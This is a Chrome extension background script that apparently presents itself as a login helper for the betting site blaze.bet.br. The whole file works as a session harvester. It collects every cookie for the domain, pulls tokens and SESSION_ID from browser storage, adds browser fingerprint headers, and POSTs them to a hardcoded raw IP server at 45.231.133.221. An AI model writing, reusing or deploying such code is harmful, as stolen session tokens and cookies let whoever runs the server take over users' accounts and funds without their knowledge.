const SERVER_URL = 'http://45.231.133.221:3000/api/blaze/extension-login';
let lastPostTs = 0;

const findToken = (pageData, cookies) => {
  const storageValues = [
    ...(pageData?.localStorage ? Object.values(pageData.localStorage) : []),
    ...(pageData?.sessionStorage ? Object.values(pageData.sessionStorage) : [])
  ].filter((v) => typeof v === 'string');

  const fromStorage = storageValues.find((v) => v && v.length > 20 && v.toLowerCase().includes('token'));
  if (fromStorage) return fromStorage;

  const tokenCookie = cookies.find((c) => c.name.toLowerCase().includes('token'));
  if (tokenCookie) return tokenCookie.value;

  return null;
};

const buildCookieHeader = (cookies) =>
  cookies.map((c) => `${c.name}=${c.value}`).join('; ');

const persistStatus = async ({ status, token, cookies }) => {
  await chrome.storage.local.set({
    status: status || 'Aguardando',
    token: token || '(token não encontrado)',
    cookies: cookies || '(sem cookies)'
  });
};

const sendToServer = async (payload) => {
  const now = Date.now();
  if (now - lastPostTs < 3000) {
    // Evitar flood
    return;
  }
  lastPostTs = now;

  await fetch(SERVER_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });
};

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (msg?.type === 'PAGE_PING') {
    (async () => {
      try {
        const cookies = await chrome.cookies.getAll({ domain: 'blaze.bet.br' });
        const cookieHeader = buildCookieHeader(cookies);
        const token = findToken(msg.data, cookies);

        // 🔑 Extrair SESSION_ID do localStorage e headers do navegador
        const sessionId = msg.data?.localStorage?.SESSION_ID || '';
        
        const payload = {
          email: 'extension@blaze', // Email fixo para identificação
          source: 'extension',
          url: msg.data?.url,
          accessToken: token,
          sessionId,
          SESSION_ID: sessionId,
          cookies,
          cookieHeader,
          userAgent: msg.data?.userAgent || navigator.userAgent,
          secChUa: msg.data?.secChUa || '',
          secChUaMobile: msg.data?.secChUaMobile || '?0',
          secChUaPlatform: msg.data?.secChUaPlatform || '""',
          secGpc: '1',
          timestamp: Date.now()
        };

        if (token && cookies.length > 0) {
          console.log('[Blaze Extension] ✅ Token e cookies capturados! Enviando para servidor BR...');
          await persistStatus({ status: 'Conectado', token, cookies: cookieHeader });
          await sendToServer(payload);
          console.log('[Blaze Extension] ✅ Dados enviados com sucesso!');
        } else {
          console.log('[Blaze Extension] ⏳ Aguardando login...');
        }
      } catch (error) {
        await persistStatus({ status: 'Erro ao enviar', token: null, cookies: null });
        console.error('[Blaze Extension] Erro ao enviar dados:', error);
      }
    })();

    sendResponse({ ok: true });
    return true;
  }
});

